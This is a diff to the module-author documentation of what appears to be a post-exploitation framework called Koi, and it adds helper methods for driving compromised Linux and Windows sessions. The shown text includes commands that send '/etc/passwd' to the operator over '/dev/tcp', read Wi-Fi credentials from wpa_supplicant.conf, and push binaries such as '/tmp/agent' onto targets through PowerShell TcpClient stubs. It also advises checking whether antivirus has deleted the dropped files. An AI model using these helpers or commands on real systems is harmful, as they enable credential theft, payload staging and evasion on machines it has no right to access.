@@ -135,6 +135,16 @@ size = self._exec_clean(f"wc -c < {quoted_path}")
 
 Internally it redirects stdout to `/dev/tcp/<local_ip>/<port>` and collects the bytes on a local socket.
 
+#### `self._try_exec(cmd, timeout=10.0) -> str`
+
+Like `_exec_clean` but silently returns an empty string on any error instead of raising. Useful for optional or best-effort commands where a missing tool or empty output is acceptable.
+
+```python
+wpa = self._try_exec("cat /etc/wpa_supplicant/wpa_supplicant.conf", timeout=8)
+if wpa:
+    # parse credentials
+```
+
 ### Windows Helpers
 
 #### `self._win_query(ps_expr, timeout=10.0) -> str`
@@ -160,15 +170,41 @@ output = self._win_query("(Get-LocalUser) | Select-Object Name | Out-String")
 
 ### File Transfer Helpers
 
-These are not methods of `KoiModule` directly, but utilities from `koi.utils.tcp` that module authors use together with `exec` or `_win_query`/`_send_ps` to transfer binary data.
+These helpers are available as `self.<method>` inside `run()`.
+
+#### `self._upload_bytes(raw, dest, timeout=30.0, on_progress=None) -> bool`
+
+Transfers `raw` bytes to `dest` on the target, handling Linux and Windows automatically. Returns `False` on TCP error.
+
+```python
+bar = self.ui.ProgressBar(total=len(raw))
+ok  = self._upload_bytes(raw, "/tmp/agent", timeout=60, on_progress=bar.update)
+bar.done()
+print()
+if not ok:
+    self.err("Upload failed.")
+    return
+```
+
+- On **Linux** it uses `/dev/tcp/<ip>/<port>` via `cat`.
+- On **Windows** it sends a PowerShell TCP-read command via `_dispatch_ps`.
+
+Post-transfer verification (e.g. `test -s`, `Test-Path`, `chmod +x`) is the caller's responsibility.
+
+#### `self._dispatch_ps(ps_cmd) -> None`
+
+Sends an arbitrary PowerShell command to the session, routing correctly for both plain and upgraded (ConPtyShell) sessions.
+
+```python
+ps = f"Remove-Item -Force '{path}' -ErrorAction SilentlyContinue"
+self._dispatch_ps(ps)
+```
+
+Use this when you need to fire a PS command that has no return value and doesn't go through `_win_query`. Commands sent via `_dispatch_ps` are logged automatically.
 
 #### `spawn_recv_server(timeout) -> (port, collect_fn)`
 
-Opens a local TCP listener on a random port and returns:
-- `port` - the port number to give to the remote side
-- `collect_fn` - a callable that blocks until the data arrives and returns it as `bytes`
-
-Used when you want the **remote machine to push data to you** (download).
+Opens a local TCP listener on a random port. Used when you want the **remote machine to push data to you** (download).
 
 ```python
 from koi.utils.tcp import spawn_recv_server
@@ -178,34 +214,7 @@ self.exec(f"cat /etc/passwd > /dev/tcp/{local_ip}/{port}")
 data = collect()   # bytes
 ```
 
-#### `spawn_send_server(raw_bytes, timeout, on_progress=None) -> (port, thread, errors)`
-
-Opens a local TCP listener and serves `raw_bytes` to the first client that connects. Returns:
-- `port` - port to connect to from the remote side
-- `thread` - the serving thread (join it to wait for completion)
-- `errors` - list that will contain any exception messages on failure
-
-Used when you want to **push data to the remote machine** (upload).
-
-```python
-from koi.utils.tcp import spawn_send_server
-
-port, thread, errors = spawn_send_server(raw, timeout=60)
-ps_cmd = (
-    f"$c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-    f"$s=$c.GetStream();"
-    f"$f=[IO.File]::OpenWrite('{dest}');"
-    f"$b=New-Object byte[] 65536;"
-    f"while(($n=$s.Read($b,0,$b.Length))-gt 0){{$f.Write($b,0,$n)}};"
-    f"$f.Close();$c.Close()"
-)
-self.sendline(ps_cmd)
-thread.join(timeout=60)
-if errors:
-    self.err(f"Upload failed: {errors[0]}")
-```
-
-#### `TCPReceiveServer` (recommended for downloads)
+#### TCPReceiveServer
 
 A class-based alternative to `spawn_recv_server` that provides a cleaner interface and built-in progress tracking. Import it from `blueprint`:
 
@@ -483,7 +492,7 @@ port = srv.port
 if os_type == "linux":
     self.exec(f"cat {quoted} > /dev/tcp/{local_ip}/{port}", timeout=30)
 else:
-    self.sendline(ps_cmd)  # PowerShell TcpClient write
+    self._dispatch_ps(ps_cmd)  # PowerShell TcpClient write
 
 # 3. Collect and write to disk
 try:
@@ -506,34 +515,28 @@ with open(local_path, "wb") as f:
 All three upload modules follow the same pattern:
 
 1. Prepare the binary locally (download from GitHub, extract from zip, etc.)
-2. Call `spawn_send_server(raw, timeout=...)` to serve the bytes.
-3. Send a PowerShell TCP-read command to the target.
-4. Join the serving thread and verify the file landed with `_win_query("(Test-Path )")`.
+2. Call `self._upload_bytes(raw, dest, timeout=...)` to transfer.
+3. Verify the file landed with `_win_query("(Test-Path ...)")` — AV may silently delete it.
 
 ```python
-from koi.utils.tcp import spawn_send_server
+def run(self) -> None:
+    # ... fetch raw bytes ...
 
-def _upload_bytes(self, raw: bytes, dest: str) -> bool:
-    local_ip = self._get_local_ip()
-    port, thread, errors = spawn_send_server(raw, timeout=60)
+    ok = self._upload_bytes(raw, dest, timeout=60)
+    if not ok:
+        self.err("Transfer failed.")
+        return
 
-    ps_cmd = (
-        f"$c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-        f"$s=$c.GetStream();"
-        f"$f=[IO.File]::OpenWrite('{dest}');"
-        f"$b=New-Object byte[] 65536;"
-        f"while(($n=$s.Read($b,0,$b.Length))-gt 0){{$f.Write($b,0,$n)}};"
-        f"$f.Close();$c.Close()"
-    )
-    self._send_ps(ps_cmd)
-    thread.join(timeout=60)
-
-    if errors:
-        return False
-
+    time.sleep(1.0)   # give AV time to act before checking
     check = self._win_query(f"(Test-Path '{dest}').ToString()")
-    return check.strip().lower() == "true"
+    if check.strip().lower() != "true":
+        self.err("File not present after upload, likely removed by AV.")
+        return
+
+    self.ok(f"Uploaded to {dest}")
 ```
+
+`_upload_bytes` handles the TCP server, the PowerShell command, and upgraded vs plain session routing automatically.
 
 ---
 
@@ -561,23 +564,15 @@ else:
     ...
 ```
 
-`_win_query` handles this transparently - you don't need the check there. You do need it when sending raw PowerShell that doesn't go through `_win_query`, for example when triggering a TCP upload:
+`_win_query` handles this transparently - you don't need the check there. For sending arbitrary PS commands without a return value, use `_dispatch_ps` — it routes correctly for both upgraded and plain sessions automatically:
 
 ```python
-def _send_ps(self, ps_cmd: str) -> None:
-    if self.session.upgraded:
-        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-        time.sleep(0.3)
-        r, _, _ = select.select([self.session.conn], [], [], 1.0)
-        if r:
-            self.session.conn.recv(4096)   # drain any echo
-    else:
-        self.sendline(ps_cmd)
+self._dispatch_ps(f"Remove-Item -Force '{path}' -ErrorAction SilentlyContinue")
 ```
 
 ### Handling both upgraded and plain sessions on Windows
 
-A portable `_send_ps` helper (as used in `sharphound.py`, `populate_win.py`, `ligolo.py`) is the cleanest way to deal with the two cases. Copy it into your module or factor it into a shared utility.
+Use `_dispatch_ps` for fire-and-forget PS commands, and `_upload_bytes` for file transfers. Both are in the base class and handle the upgraded/plain split internally — you don't need to implement it yourself.
 
 ---
 
@@ -615,4 +610,6 @@ def _cleanup(self, work_dir: str) -> None:
 - [ ] `name`, `description`, and `platform` are set correctly
 - [ ] `run()` is implemented
 - [ ] `exec()` is only called on Linux sessions; `_win_query()` for Windows
-- [ ] Upgraded-session compatibility is handled (either via `_win_query` or a `_send_ps` helper)
+- [ ] File uploads use `self._upload_bytes()` — do not reimplement the TCP transfer manually
+- [ ] Arbitrary PS commands use `self._dispatch_ps()` — do not call `session.conn.sendall()` directly
+- [ ] Upgraded-session compatibility is handled automatically via `_win_query`, `_upload_bytes`, or `_dispatch_ps`
